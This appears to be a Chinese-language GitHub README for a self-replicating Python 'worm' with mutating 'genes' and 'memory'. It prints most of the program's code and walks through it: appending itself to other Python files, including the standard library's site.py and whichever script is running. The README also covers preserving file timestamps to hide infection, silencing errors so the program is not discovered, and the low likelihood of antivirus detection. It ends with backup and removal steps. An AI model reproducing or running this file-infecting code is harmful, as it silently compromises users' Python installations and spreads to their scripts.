[[English](https://github.com/pypy66/python-self-replication/blob/main/README.md) | 简体中文]

一个简单的Python自我复制程序，具有复制时修改自身"基因"的功能，请勿用于非法用途!  

## 程序原理

本项目实现了一个具有**自我传播**和**变异**能力的 Python 脚本。  
主要功能：
1. **提取自身代码**：读取当前脚本文件，提取包含标记的代码段。
2. **判断传播条件**：检查目标文件是否满足传播条件（如文件大小、是否已包含脚本）。
3. **基因变异**：在传播过程中对核心配置参数进行随机变异。
4. **传播代码**：将变异后的基因和脚本代码附加到目标文件中。
5. **传播历史和次数记录**：更新已传播文件的记录，作为脚本基因中的"记忆"。

下面是针对最新版本`worm_v3.py`的执行过程介绍。

### 1. **初始化标记**
程序首先定义了一个 `genes` 字典和一个标记字符串 `mark`：
```python
genes = {'minsize': 3072, 'target_mod': 'site', 'cnt': 0, 'memory': []}
mark = "#####MyPython####"  # 唯一标识符
```
- **基因`genes`**：
  - `minsize`：目标文件的最小大小（以字节为单位），只有文件大小超过此值时，脚本才会传播。
  - `target_mod`：目标模块名称，脚本会尝试将自身附加到该模块的源文件中。
  - `cnt`：记录脚本传播的次数。
  - `memory`：记录已修改的文件，作为嵌入基因的记忆的一部分。
- **`mark`** ：脚本的特征标识，既用来检测目标文件是否已被传播，又用来分隔源文件，便于找出末尾自身的代码。

### 2. **提取自身代码**
脚本通过 `find_code` 函数读取自身代码：
```python
def find_code(file):
    code = ''
    with open(file, encoding="utf-8") as f:
        for line in f:
            if mark in line.strip():
                code = line + f.read()
    return code
```
- 打开当前脚本文件（`__file__`）。
- 搜索包含 `mark` 的行，找到脚本的起始位置。
- 提取从标记行开始的所有代码。

### 3. **传播逻辑**
**传播到文件** (`spread_to_file`函数)：
```python
def spread_to_file(file, code):
    import os; stat = os.stat(file)
    old_time = stat.st_atime, stat.st_mtime
    with open(file, 'r', encoding='utf-8') as f:
        for line in f:
            if mark in line: return
    if os.path.getsize(file) >= genes['minsize']:
        backup = genes['memory'].copy()
        add_memory(genes, os.path.split(file)[1])
        with open(file, 'a', encoding='utf-8') as f:
            f.write('\ngenes=%r\n' % mutate(genes))
            f.write(code)
        os.utime(file, old_time)
        genes['memory'] = backup
```
- 如果标记`mark`在目标文件已存在，或者文件大小小于`minsize`，则终止传播。
- 否则：
    - 调用 `mutate` 变异基因。
    - 将基因和脚本代码添加到目标文件的末尾。
    - 利用`os.utime`恢复原先的文件修改日期，避免留下传播痕迹。

**传播到模块** (`spread`函数)：
```python
def spread(mod, code):
    spread_to_file(__import__(mod).__file__, code)
```
- 调用内置函数 `__import__` 动态加载模块。
- 获取模块的源文件路径，并调用 `spread_to_file` 将自身附加到模块的源文件。

### 4. **基因变异**
传播时脚本会调用 `mutate` 函数，以手动变异基因：
```python
def mutate(gene):
    import sys, random as r
    mut = gene.copy()
    mut['memory'] = gene['memory'].copy()
    if r.random() < 0.2:
        mut['minsize'] = max(1500, mut['minsize'] + round(r.gauss(0, 80)))
    if (r.random() < 0.1 if '__name__' == '__main__' else r.random() < 0.01):
        mod = None
        while not (hasattr(sys.modules.get(mod), '__file__') \
                   and sys.modules[mod].__file__.lower().endswith('.py')):
            mod = r.choice(list(sys.modules))
        mut['target_mod'] = mod
    return mut
```
- **变异规则**：
  - 20% 的概率调整 `minsize`，改变文件大小阈值。
  - 随机更改 `target_mod`，选择另一个 Python 模块作为传播目标。如果是主程序(`__name__=='__main__'`)，则变异概率更高，这是因为主程序执行时已经在`sys.modules`导入了较多的模块。
- 基因变异能改变脚本的行为，模拟了自然界优胜劣汰的进化机制。

### 5. **记忆机制**
脚本实现了 `add_memory` 函数，记录传播历史、传播次数等信息，~~类似真实生物的记忆，~~目前用于调试，将来脚本会根据记忆自动决策！
```python
def add_memory(gene, item):
    import sys, os
    mem = gene['memory']
    mem.append(item)
    gene['cnt'] += 1
    size = sum(len(item) for item in mem)
    maxsize = 40
    while mem and size > maxsize:
        size -= len(mem.pop(0))
```
- 每次传播都记录下传播到的文件名。
- 如果总大小超过`maxsize`的限制，会删除最早的记录，模拟真实生物的"遗忘"机制。
- 每次传播增加一次`gene['cnt']`，即使最早的记录被"遗忘"，传播次数仍然保留。

### 6. **主程序**
脚本的主程序：
```python
try:
    code = find_code(__file__)  # 提取自身代码
    spread(genes['target_mod'], code)  # 传播到目标模块
    spread_to_file(__import__('sys').argv[0], code)  # 传播到当前运行的主程序
except:pass
del find_code,add_memory,mutate,spread,spread_to_file,genes,mark
try:del code
except NameError:pass
```
- 首先提取自身代码。
- 传播到目标模块（`genes['target_mod']`），以及当前正在执行的脚本（`sys.argv[0]`）。
- `except:pass`避免了报错导致程序被发现。
- 完成后清理所有变量和函数，避免污染模块如`site`的命名空间。

~~**代码与生物病毒的区别**~~  

这个python病毒需要存储在.py格式文件才能发挥功能，.py文件相当于病毒的蛋白质外壳，内部存放了病毒代码，类似蛋白质外壳存放病毒的遗传物质。  
而解释器解析和运行带病毒的python文件，相当于病毒进入细胞，具备了传播的能力。  
`spread("site")`将代码嵌入了标准库的代码，类似病毒的逆转录过程。  
而`spread_to_file(__import__("sys").argv[0])`将代码传播到当前运行的.py文件，相当于转译成了新的病毒，而当前运行的新的.py文件相当于新的病毒的蛋白质外壳。  

而对于基因，两者都实现了各自的基因和变异，代码中的基因`genes`仅仅是用于控制病毒的行为，没有功能实现，而真正病毒的基因包含功能实现。  
此外代码中的`mutate`函数只能变异数据部分`genes`，不能变异代码，而真正的病毒的整个基因是能变异的。  

## 历史版本

- `worm_v1.py`: 最早的原型，具备传播到非Python解释器必需模块的功能。
- `worm_v2.py`: 采用了`sys.argv[0]`替代`__main__`，能够在Python解释器启动时找到运行的主脚本。
- `worm_v2_1.py`: 自动解析`-m`的命令行参数（根据[官方文档](https://docs.python.org/zh-cn/3.7/using/cmdline.html#cmdoption-m)，Python解释器使用`-m`启动时会将sys.argv[1]设为`-m`，但是`sys.argv`里面没有具体的模块名称，因此调用了系统API直接获取命令行参数中的模块名）
- `worm_v3.py`: 最新的版本，添加了"基因"、变异和记忆功能。
- `worm_v3_no_comments.py`: 和`worm_v3.py`完全相同，但去掉了注释，减小了文件体积。

## 如何安全地体验

Windows:  
首先打开Python解释器的安装目录，选择`Lib`，原地按下Ctrl+C、Ctrl+V，复制一份标准库的`Lib`目录。
体验完毕后，删除旧的`Lib`目录，将`Lib - 副本`重命名为`Lib`，即可。
![](https://i-blog.csdnimg.cn/direct/ae46508354c2476f8fc9b6c9c90ee00b.png)

其他操作系统的步骤和Windows的大致相同。

## 如何彻底清除本程序

目前的杀毒软件一般针对可执行文件，如.exe、.dll等，以及一些比较流行的脚本语言的病毒，如宏(VBA)病毒、VBS病毒等。
但由于Python解释器普通人很少安装，Python的脚本病毒较少，杀毒软件一般不会针对.py文件进行检测。

解决方法除了重装Python解释器之外，还有这个方法：
安装并打开[Everything](https://www.voidtools.com/)软件，打开“搜索” => “高级搜索”菜单，输入以下关键词：  
![](https://i-blog.csdnimg.cn/direct/70e38466919e4cf9b5d844956b3a46c3.png)

等待一段时间后，编辑找到的被“感染”Python文件(如site.py)，将末尾的本程序的代码删除，即可。